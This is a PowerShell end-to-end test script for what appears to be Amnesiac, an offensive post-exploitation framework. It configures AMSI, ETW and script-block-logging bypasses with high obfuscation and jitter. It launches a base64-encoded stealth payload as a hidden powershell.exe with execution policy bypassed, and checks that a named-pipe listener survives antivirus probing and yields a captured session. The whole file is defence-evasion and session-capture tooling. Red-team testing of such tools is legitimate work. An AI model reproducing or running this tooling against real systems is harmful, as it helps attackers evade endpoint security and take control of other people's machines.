# LocalFullFlowTest.ps1 — end-to-end global listener test on localhost
# Uses real PayloadConfig (Jitter='medium', Obfuscation='high') to match production behaviour.
# Run from repo root or any directory — script sets its own location.

Set-Location 'C:\users\localuser\Downloads\Amnesiac-main\Amnesiac-main'
. .\Amnesiac.ps1

# Initialise the same globals that Amnesiac function sets at startup
$global:MultipleSessions    = [System.Collections.Generic.List[psobject]]::new()
$global:AllOurTargets       = @()
$global:AllUserDefinedTargets = @('.')    # bypass CheckReachableHosts — connect to localhost
$global:Message             = $null
$global:Detach              = $false

# Use real EndMarker / BufferSize (already randomised by sourcing Amnesiac.ps1's top-level code
# via Initialize-ToolCache; the Amnesiac function normally re-randomises them, so do it here too)
$global:EndMarker  = -join ((65..90 + 97..122) | Get-Random -Count 8 | % {[char]$_})
$global:BufferSize = @(512, 1024, 2048, 4096) | Get-Random

# Real PayloadConfig — matches production defaults from Amnesiac startup
$global:PayloadConfig = @{
    Amsi        = 'pageguard'
    Etw         = 'provider'
    Sbl         = $true
    Launcher    = 'ps'
    Encoding    = 'gzip'
    Jitter      = 'medium'
    Obfuscation = 'high'
    Keys        = @{}
}

# Random pipe name matching what Print-MultiListener would use
$global:MultiPipeName = -join ((65..90 + 97..122) | Get-Random -Count 16 | % {[char]$_})

Write-Output ""
Write-Output "=== Local Full-Flow Test (Global Listener / Stealth) ==="
Write-Output "  EndMarker  : $global:EndMarker"
Write-Output "  BufferSize : $global:BufferSize"
Write-Output "  PipeName   : $global:MultiPipeName"
Write-Output "  Jitter     : $($global:PayloadConfig.Jitter)"
Write-Output "  Obfuscation: $($global:PayloadConfig.Obfuscation)"
Write-Output ""

# Generate stealth server payload exactly as Print-MultiListener does
$SID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
$built = New-PayloadScript -IsServer -PipeName $global:MultiPipeName -SID $SID
$inlinePS = $built.InlinePS + ";exit"
$enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($inlinePS))

Write-Output "Starting payload process..."
$proc = Start-Process powershell.exe -WindowStyle Hidden `
    -ArgumentList '-ep','Bypass','-NoProfile','-enc',$enc -PassThru

# Wait for named pipe to appear (up to 25s: max jitter 5s + bypass code + phantom rejection 2s + margin)
Write-Output "Waiting for pipe to appear (max 25s for jitter + bypass code)..."
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$pipeUp = $false
while ($sw.ElapsedMilliseconds -lt 25000) {
    if (Test-Path "\\.\pipe\$global:MultiPipeName") {
        $pipeUp = $true
        Write-Output "  Pipe appeared after $($sw.ElapsedMilliseconds)ms"
        break
    }
    Start-Sleep -Milliseconds 500
}

if (-not $pipeUp) {
    Write-Host "  [FAIL] Pipe never appeared within 25s (process alive: $(-not $proc.HasExited))" -ForegroundColor Red
    try { $proc.Kill() } catch {}
    exit 1
}

# Allow phantom-rejection loop to complete: the payload waits 2s for a real command after each
# WaitForConnection(). Give it 3s so any AV probe gets rejected and pipe is recreated cleanly.
Write-Output "Waiting 3s for phantom rejection cycle to settle..."
Start-Sleep -Milliseconds 3000

# Verify pipe is still up after phantom rejection cycle
if (-not (Test-Path "\\.\pipe\$global:MultiPipeName")) {
    Write-Host "  [FAIL] Pipe disappeared after phantom rejection window (process alive: $(-not $proc.HasExited))" -ForegroundColor Red
    try { $proc.Kill() } catch {}
    exit 1
}
Write-Output "  Pipe still up after phantom-rejection window."

# Run Scan-WaitingTargets — AllUserDefinedTargets=@('.') ensures it connects to localhost
Write-Output "Running Scan-WaitingTargets against localhost..."
$countBefore = $global:MultipleSessions.Count
Scan-WaitingTargets
$countAfter = $global:MultipleSessions.Count

if ($countAfter -gt $countBefore) {
    $sess = $global:MultipleSessions[$countBefore]
    Write-Host "  [PASS] Session captured: $($sess.ComputerName) [$($sess.UserID)]" -ForegroundColor Green
} else {
    Write-Host "  [FAIL] Scan-WaitingTargets returned no session" -ForegroundColor Red
    Write-Output "  Process alive: $(-not $proc.HasExited)"
    Write-Output "  Pipe still present: $(Test-Path "\\.\pipe\$global:MultiPipeName")"
    try { $proc.Kill() } catch {}
    exit 1
}

try { if (-not $proc.HasExited) { $proc.Kill() } } catch {}
Write-Output ""
Write-Output "All tests passed."
